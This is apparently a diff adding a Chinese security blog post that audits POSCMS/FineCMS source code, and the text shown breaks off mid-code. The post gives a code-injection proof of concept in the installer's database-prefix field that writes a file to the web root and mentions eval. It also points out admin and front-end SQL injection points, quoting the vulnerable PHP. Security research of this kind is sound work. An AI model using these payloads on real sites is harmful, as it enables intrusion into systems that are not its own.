+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">database</span><span class="p">();</span>
+                    <span class="nv">$salt</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">999</span><span class="p">)),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+                    <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span><span class="o">.</span><span class="nv">$salt</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]));</span>
+
+                    <span class="c1">// 导入表结构</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span>
+                        <span class="k">array</span><span class="p">(</span><span class="s1">'{dbprefix}'</span><span class="p">,</span> <span class="s1">'{username}'</span><span class="p">,</span> <span class="s1">'{password}'</span><span class="p">,</span> <span class="s1">'{salt}'</span><span class="p">,</span> <span class="s1">'{email}'</span><span class="p">),</span>
+                        <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">],</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$salt</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]),</span>
+                        <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/install.sql'</span><span class="p">)</span>
+                    <span class="p">));</span>
+
+                    <span class="c1">// 导入会员菜单数据</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span>
+                        <span class="s1">'{dbprefix}'</span><span class="p">,</span>
+                        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="p">,</span>
+                        <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/member_menu.sql'</span><span class="p">)</span>
+                    <span class="p">));</span>
+
+                    <span class="c1">// 系统配置文件</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'system_model'</span><span class="p">);</span>
+                    <span class="nv">$config</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                        <span class="s1">'SYS_LOG'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
+                        <span class="s1">'SYS_KEY'</span> <span class="o">=&gt;</span> <span class="s1">'poscms'</span><span class="o">.</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">()),</span>
+                        <span class="s1">'SYS_DEBUG'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
+                        <span class="s1">'SYS_HELP_URL'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
+                        <span class="s1">'SYS_EMAIL'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span>
+                        <span class="s1">'SYS_MEMCACHE'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
+                        <span class="s1">'SYS_UPLOAD_DIR'</span> <span class="o">=&gt;</span> <span class="nx">SYS_UPLOAD_DIR</span><span class="p">,</span>
+                        <span class="s1">'SYS_CRON_QUEUE'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
+                        <span class="s1">'SYS_CRON_NUMS'</span> <span class="o">=&gt;</span> <span class="mi">20</span><span class="p">,</span>
+                        <span class="s1">'SYS_CRON_TIME'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+
+
+                        <span class="s1">'SYS_ONLINE_NUM'</span> <span class="o">=&gt;</span> <span class="mi">1000</span><span class="p">,</span>
+                        <span class="s1">'SYS_ONLINE_TIME'</span> <span class="o">=&gt;</span> <span class="mi">7200</span><span class="p">,</span>
+
+                        <span class="s1">'SYS_NAME'</span> <span class="o">=&gt;</span> <span class="s1">'POSCMS'</span><span class="p">,</span>
+                        <span class="s1">'SYS_NEWS'</span> <span class="o">=&gt;</span> <span class="s1">'TRUE'</span><span class="p">,</span>
+                        <span class="s1">'SYS_CMS'</span> <span class="o">=&gt;</span> <span class="s1">'POSCMS'</span><span class="p">,</span>
+                        <span class="s1">'SYS_UPDATE'</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span>
+
+                        <span class="s1">'SITE_EXPERIENCE'</span> <span class="o">=&gt;</span> <span class="s1">'经验值'</span><span class="p">,</span>
+                        <span class="s1">'SITE_SCORE'</span> <span class="o">=&gt;</span> <span class="s1">'虚拟币'</span><span class="p">,</span>
+                        <span class="s1">'SITE_MONEY'</span> <span class="o">=&gt;</span> <span class="s1">'金钱'</span><span class="p">,</span>
+                        <span class="s1">'SITE_CONVERT'</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
+                        <span class="s1">'SITE_ADMIN_CODE'</span> <span class="o">=&gt;</span> <span class="s1">'FALSE'</span><span class="p">,</span>
+                        <span class="s1">'SITE_ADMIN_PAGESIZE'</span> <span class="o">=&gt;</span> <span class="mi">8</span><span class="p">,</span>
+
+                        <span class="s1">'SYS_CACHE_INDEX'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_MINDEX'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_MSHOW'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_MSEARCH'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_SITEMAP'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_LIST'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_MEMBER'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_ATTACH'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_FORM'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_POSTER'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_SPACE'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+                        <span class="s1">'SYS_CACHE_TAG'</span> <span class="o">=&gt;</span> <span class="mi">300</span><span class="p">,</span>
+
+                    <span class="p">);</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">system_model</span><span class="o">-&gt;</span><span class="na">save_config</span><span class="p">(</span><span class="nv">$config</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span>
+                    <span class="c1">// 站点配置文件</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'site_model'</span><span class="p">);</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">library</span><span class="p">(</span><span class="s1">'dconfig'</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/site/1.php'</span><span class="p">))</span> <span class="p">{</span>
+                        <span class="nv">$config</span> <span class="o">=</span> <span class="k">require</span> <span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/site/1.php'</span><span class="p">;</span>
+                    <span class="p">}</span>
+                    <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_THEME'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_TEMPLATE'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
+                    <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_DOMAIN'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_ATTACH_HOST'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">'SITE_ATTACH_URL'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_HOST'</span><span class="p">]);</span>
+                    <span class="nv">$site</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+                        <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="s1">'POSCMS'</span><span class="p">,</span>
+                        <span class="s1">'domain'</span> <span class="o">=&gt;</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_HOST'</span><span class="p">]),</span>
+                        <span class="s1">'setting'</span> <span class="o">=&gt;</span> <span class="nv">$config</span><span class="p">,</span>
+                    <span class="p">);</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">site_model</span><span class="o">-&gt;</span><span class="na">add_site</span><span class="p">(</span><span class="nv">$site</span><span class="p">);</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dconfig</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'config/site/1.php'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">note</span><span class="p">(</span><span class="s1">'站点配置文件'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">space</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">to_require_one</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">site_model</span><span class="o">-&gt;</span><span class="na">config</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span>
+
+                    <span class="c1">// 初始化菜单</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'menu_model'</span><span class="p">);</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">menu_model</span><span class="o">-&gt;</span><span class="na">init</span><span class="p">();</span>
+
+                    <span class="c1">// 导入默认数据</span>
+                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span>
+                        <span class="k">array</span><span class="p">(</span><span class="s1">'{dbprefix}'</span><span class="p">,</span> <span class="s1">'{site_url}'</span><span class="p">),</span>
+                        <span class="k">array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="p">,</span> <span class="s1">'http://'</span><span class="o">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_HOST'</span><span class="p">])),</span>
+                        <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/default.sql'</span><span class="p">)</span>
+                    <span class="p">));</span>
+                    <span class="k">exit</span><span class="p">(</span><span class="nx">dr_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_url</span><span class="p">(</span><span class="s1">'install/index'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'step'</span> <span class="o">=&gt;</span> <span class="nv">$step</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))));</span>
+                <span class="p">}</span>
+                <span class="k">break</span><span class="p">;</span>
+
+            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+                <span class="nv">$log</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+                <span class="nv">$sql</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install/install.sql'</span><span class="p">);</span>
+                <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/`\{dbprefix\}(.+)`/U'</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$match</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$log</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+                <span class="p">}</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+                    <span class="s1">'log'</span> <span class="o">=&gt;</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'&lt;finecms&gt;'</span><span class="p">,</span> <span class="nv">$log</span><span class="p">),</span>
+                <span class="p">));</span>
+                <span class="k">break</span><span class="p">;</span>
+
+            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+                <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install.lock'</span><span class="p">,</span> <span class="nb">time</span><span class="p">());</span>
+                <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">WEBPATH</span><span class="o">.</span><span class="s1">'cache/install.new'</span><span class="p">,</span> <span class="nb">time</span><span class="p">());</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+            <span class="s1">'step'</span> <span class="o">=&gt;</span> <span class="nv">$step</span><span class="p">,</span>
+        <span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'install_'</span><span class="o">.</span><span class="nv">$step</span><span class="o">.</span><span class="s1">'.html'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">);</span>
+    <span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>然后定位到<code class="highlighter-rouge">$data['dbprefix']</code>是可控的，也就是数据库的表前缀，前面的数据库配置文件内容以及交代清楚，接下来构造一个POC：
+<code class="highlighter-rouge">','x'=&gt;file_put_contents('s.txt','ss'),'b'=&gt;'b</code></p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x01.jpg" alt="POC" /></p>
+
+<p>这个POC是在数组中的，会在网站根目录新建一个<code class="highlighter-rouge">s.txt</code>内容为<code class="highlighter-rouge">ss</code>，在PHP的数组里，你可以放eval等字符，但是这个<code class="highlighter-rouge">database.php</code>是不能直接访问的，因为<code class="highlighter-rouge">if (!defined('BASEPATH')) exit('No direct script access allowed');</code>这一句是判断是否是框架初始化后加载此文件，否则就不再继续向下运行，好像这种思路都是框架常用的办法。</p>
+
+<h2 id="0x02-后台sql注入">0x02 后台SQL注入</h2>
+
+<p>第二处是在后台的某处搜索上，这个Input是一个日期输入框，但是不是原生的Input。</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x02.jpg" alt="DATE" /></p>
+
+<p>我们抓包看看请求：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x03.jpg" alt="Request" /></p>
+
+<p>控制器文件位于：<code class="highlighter-rouge">diy\module\member\controllers\admin\Home.php</code></p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x04.jpg" alt="Controller" /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="sd">/**
+     * 经验值
+     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">experience</span><span class="p">()</span> <span class="p">{</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_experience</span><span class="p">();</span>
+
+        <span class="nv">$uid</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'uid'</span><span class="p">);</span>
+        <span class="nb">print_r</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="p">);</span>
+        <span class="c1">// 根据参数筛选结果</span>
+        <span class="nv">$param</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'uid'</span> <span class="o">=&gt;</span> <span class="nv">$uid</span><span class="p">,</span> <span class="s1">'type'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'search'</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+        <span class="c1">// 数据库中分页查询</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$param</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">score_model</span><span class="o">-&gt;</span><span class="na">limit_page</span><span class="p">(</span><span class="nv">$param</span><span class="p">,</span> <span class="nb">max</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'page'</span><span class="p">),</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'total'</span><span class="p">));</span>
+        <span class="nv">$param</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">;</span>
+
+        <span class="nv">$_param</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'search'</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">score_model</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">);</span>
+        <span class="nv">$_param</span> <span class="o">=</span> <span class="nv">$_param</span> <span class="o">?</span> <span class="nv">$param</span> <span class="o">+</span> <span class="nv">$_param</span> <span class="o">:</span> <span class="nv">$param</span><span class="p">;</span>
+
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+            <span class="s1">'list'</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
+            <span class="s1">'name'</span> <span class="o">=&gt;</span> <span class="nx">SITE_EXPERIENCE</span><span class="p">,</span>
+            <span class="s1">'param'</span> <span class="o">=&gt;</span> <span class="nv">$_param</span><span class="p">,</span>
+            <span class="s1">'pages'</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_pagination</span><span class="p">(</span><span class="nx">dr_url</span><span class="p">(</span><span class="s1">'member/home/experience'</span><span class="p">,</span> <span class="nv">$param</span><span class="p">),</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'total'</span><span class="p">])</span>
+        <span class="p">));</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">'score_index.html'</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Model文件：<code class="highlighter-rouge">diy\module\member\models\Score_model.php</code></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="cm">/*
+   * 条件查询
+   *
+   * @param object  $select 查询对象
+   * @param array $param  条件参数
+   * @return  array 
+   */</span>
+  <span class="k">private</span> <span class="k">function</span> <span class="nf">_where</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$select</span><span class="p">,</span> <span class="nv">$param</span><span class="p">)</span> <span class="p">{</span>
+  
+    <span class="nv">$_param</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">duri</span><span class="o">-&gt;</span><span class="na">uri</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="o">.</span><span class="nx">SITE_ID</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">ip_address</span><span class="p">()</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">user_agent</span><span class="p">());</span> <span class="c1">// 缓存文件名称</span>
+    
+    <span class="c1">// 存在POST提交时，重新生成缓存文件</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_POST</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">'data'</span><span class="p">);</span> <span class="c1">//这里就没有过滤</span>
+      <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="mi">3600</span><span class="p">);</span>
+      <span class="nv">$param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="c1">// 存在search参数时，读取缓存文件</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="p">);</span>
+      <span class="nv">$_param</span><span class="p">[</span><span class="s1">'search'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="nb">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'end'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$select</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'inputtime BETWEEN '</span><span class="o">.</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'start'</span><span class="p">]</span><span class="o">.</span><span class="s1">' AND '</span><span class="o">.</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'end'</span><span class="p">]);</span>
+    <span class="p">}</span>
+    
+    <span class="nv">$select</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'type'</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'type'</span><span class="p">]);</span>
+    <span class="nv">$select</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">'uid'</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">]);</span>
+    <span class="nv">$_param</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'uid'</span><span class="p">];</span>
+    
+    <span class="k">return</span> <span class="nv">$_param</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>故此出现了一个注入点：</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-18/0x05.jpg" alt="SQL Injection" /></p>
+
+<h2 id="0x03-前台sql注入">0x03 前台SQL注入</h2>
+
+<p>文件位置：<code class="highlighter-rouge">diy\module\member\controllers\Account.php</code>，约：757行左右，出现一处变量未过滤的情况。</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="sd">/**
+     * 附件管理
+     */</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">attachment</span><span class="p">()</span> <span class="p">{</span>
+
+        <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">dr_safe_replace</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'ext'</span><span class="p">));</span>
+        <span class="nv">$table</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'module'</span><span class="p">);</span> <span class="c1">// 这个变量没有过滤</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">load</span><span class="o">-&gt;</span><span class="na">model</span><span class="p">(</span><span class="s1">'attachment_model'</span><span class="p">);</span>
+
+        <span class="nv">$page</span> <span class="o">=</span> <span class="nb">max</span><span class="p">((</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">'page'</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
+        
+        <span class="c1">// 检测可管理的模块</span>
+        <span class="nv">$module</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+        <span class="nv">$modules</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_cache</span><span class="p">(</span><span class="s1">'module'</span><span class="p">,</span> <span class="nx">SITE_ID</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$modules</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$modules</span> <span class="k">as</span> <span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$mod</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_cache</span><span class="p">(</span><span class="s1">'module-'</span><span class="o">.</span><span class="nx">SITE_ID</span><span class="o">.</span><span class="s1">'-'</span><span class="o">.</span><span class="nv">$dir</span><span class="p">);</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_module_post_catid</span><span class="p">(</span><span class="nv">$mod</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">markrule</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$module</span><span class="p">[</span><span class="nv">$dir</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$mod</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        
+        <span class="c1">// 查询结果</span>
+        <span class="k">list</span><span class="p">(</span><span class="nv">$total</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">attachment_model</span><span class="o">-&gt;</span><span class="na">limit</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uid</span><span class="p">,</span> <span class="nv">$page</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pagesize</span><span class="p">,</span> <span class="nv">$ext</span><span class="p">,</span> <span class="nv">$table</span><span class="p">);</span>
+        
